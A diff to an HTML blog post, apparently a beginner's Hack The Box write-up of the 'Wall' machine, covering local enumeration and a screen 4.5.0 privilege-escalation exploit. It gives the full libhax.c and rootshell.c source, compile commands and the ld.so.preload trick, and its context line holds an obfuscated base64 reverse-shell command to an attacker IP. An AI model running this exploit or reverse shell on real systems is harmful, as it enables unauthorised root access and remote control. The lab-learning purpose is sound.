@@ -341,6 +341,180 @@ echo${IFS}ZXhlYyBzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC8xMzM3IDA+JjEK|base64${I
 
 <img src="/img/{{ page.code }}/wall_shell.png" alt="We got a shell!" />
 
+<p>So now, we can look around and try to find a way to own user and root. We learn with <code>whoami</code> that we are currently
+    the user <code>www-data</code>. This is a user who has access to the web server, and that’s basically all.
+    We can find all users the following way:</p>
+
+<pre class="prettyprint nocode">
+$ cat /etc/passwd | cut -d: -f 1
+root
+daemon
+bin
+sys
+sync
+games
+man
+lp
+mail
+news
+uucp
+proxy
+www-data
+backup
+list
+irc
+gnats
+nobody
+systemd-network
+systemd-resolve
+syslog
+messagebus
+_apt
+uuidd
+sysmonitor
+sshd
+mysql
+postfix
+centreon
+Debian-snmp
+shelby
+</pre>
+
+<p>In this list, the only user besides root who isn’t a user required by a program would be shelby. We can also see in
+    the <code>/home</code> directory that shelby has a home directory, so maybe it would be the user to own.</p>
+
+<p>As it was my first time with privilege escalation, I had to browse a lot of documentation and to gather a lot of
+    hints from forums to know where I should head.</p>
+
+<p>A very interesting concept I could learn about was the SUID permission: a file with SUID permission allows the user
+    to execute it with the privileges of another user. For instance, if a file owned by root has the SUID flag, then
+    any user can execute it as root. The following command lists all the files that have this SUID permissions:</p>
+
+<pre class="prettyprint nocode">
+$ find / -perm -u=s -type f 2>/dev/null
+/bin/mount
+/bin/ping
+/bin/screen-4.5.0
+/bin/fusermount
+/bin/su
+/bin/umount
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/eject/dmcrypt-get-device
+</pre>
+
+<p>Exploring this list of files shows us something a bit strange: the program <code>screen</code> has SUID permissions,
+    which can be useful in several ways, but can be exploited as well.</p>
+
+<p>In fact, there is an exploit in version 4.05 which allows privilege escalation.<sup><a href="#fn4" id="ref4">4</a></sup> With this version, the following command:</p>
+
+<pre class="prettyprint nocode">
+$ screen -D -m -L bla.bla echo "hello world"
+</pre>
+<p>will create the file <code>bla.bla</code> if it doesn’t exist and put <code>echo "hello world"</code> in it; plus <code>bla.bla</code> will be owned by root.
+    So this allows us to create root-owned files in a directory in which we don’t have write permission, for instance.
+    This will actually be useful soon.</p>
+
+<p>As we saw earlier, there is a script which exploits this vulnerability in order to spawn a shell with root privileges.<sup><a href="#fn5" id="ref5">5</a></sup>
+    As I didn’t succeed in just executing the script, I decided to break it down in small parts to
+    understand better how it was working.</p>
+
+<p>First, we’re going to work in the <code>/tmp</code> directory. The script begins by creating a C shared library with the
+    following code, in file <code>libhax.c</code>:</p>
+
+<pre class="prettyprint linenums">
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+}
+</pre>
+
+<p>So this file defines a function that will be executed before the function main thanks to the constructor attribute.
+    This function makes the file <code>/tmp/rootshell</code> owned by root and gives it the SUID permission.
+    Then, it deletes the file <code>/etc/ld.so.preload</code> which we will see just after.</p>
+
+<p>We compile this with:</p>
+
+<pre class="prettyprint nocode">
+$ gcc -fPIC -shared -ldl -o libhax.so libhax.c
+</pre>
+
+<p>Then, we’re going to create the source code for our root-privileged shell, in file <code>rootshell.c</code>:</p>
+
+<pre class="prettyprint linenums">
+#include &lt;stdio.h&gt;
+
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+</pre>
+
+<p>This file tries to set its own UID, GID, EUID and EGID to 0, which is the id of root.
+    Then it executes the command <code>/bin/sh</code> to spawn a shell. We compile it with:</p>
+
+<pre class="prettyprint nocode">
+$ gcc -o rootshell rootshell.c
+</pre>
+
+<p>So now, how are we able to get root privilege with that? This is the trick: we are going to the directory <code>/etc</code>.
+    This directory can contain a file named <code>ld.so.preload</code>: this file is actually a list of shared libraries which we
+    want to load before running almost any binary. This means that if I put in this file <code>/tmp/libhax.so</code>, then the
+    content of <code>libhax.so</code> will be loaded before every binary I use, such as <code>/bin/ls</code> for instance.</p>
+
+<p>As we saw before, we can use the <code>screen</code> trick to create this file in <code>/etc</code> where we don’t have write permission:</p>
+
+<pre class="prettyprint nocode">
+$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+</pre>
+
+<p>So now we have a file <code>ld.so.preload</code> which contains what we want, in a directory where we couldn’t write. So now,
+    we just need to execute a random binary. However, it can’t be just random, because if we want it to work,
+    we need to launch a binary which has root privileges: why not <code>screen</code>?</p>
+
+<p>The option <code>-ls</code> uses the <code>screen</code> program without really launching it, so we can use it just by typing screen <code>-ls</code>.
+    Here it is, our library is loaded. As our library defined a constructor function, this function was executed before
+    <code>screen</code> was, and as it was executed with root privileges, it could successfully perform the
+    <code>chown</code> and <code>chmod</code> on rootshell:</p>
+
+<img src="/img/{{ page.code }}/wall_shell2.png" alt="Binary rootshell is owned by root and has SUID" />
+
+<p>Now, we just have to run <code>./rootshell</code>, and we got a root-privileged shell!</p>
+
+<img src="/img/{{ page.code }}/wall_shell3.png" alt="We are root" />
+
+<p>So now, we just have to go to <code>/root</code> to read <code>root.txt</code> to own root; then we go to
+    <code>/home/shelby</code> and read <code>user.txt</code> to own user.</p>
+
+<p>A lot of users on Hackthebox's forum mentioned that it maybe wasn’t the intended way to own user because it was too
+    easy once you got root; there might be another way that I didn’t find to own user.</p>
+
+<p>So I had a lot of fun trying to own this machine, and I’m really happy I got so far in not such a long time, as it
+    is my very first box. I learned a lot of things, and I hope that for the next one I will need less hints.</p>
+
+<p><strong>Note:</strong> Now I understood why one of my first command didn’t work; I was trying to use <code>ncat</code>, which wasn’t installed on the machine…</p>
+
+<p>So this is over for this box! If you have any comments or suggestions, feel free to open an issue on GitHub page </p>
+
+
 
 <!-- Footnotes -->
 
@@ -350,4 +524,10 @@ echo${IFS}ZXhlYyBzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC8xMzM3IDA+JjEK|base64${I
 <br>
 
 <sup id="fn2">2, 3. https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/<a href="#ref2" title="Jump back to footnote 2 in the text.">↩</a></sup>
+<br>
+
+<sup id="fn4">4. https://www.exploit-db.com/exploits/41152<a href="#ref4" title="Jump back to footnote 4 in the text.">↩</a></sup>
+<br>
+
+<sup id="fn5">5. https://www.exploit-db.com/exploits/41154<a href="#ref5" title="Jump back to footnote 5 in the text.">↩</a></sup>
 
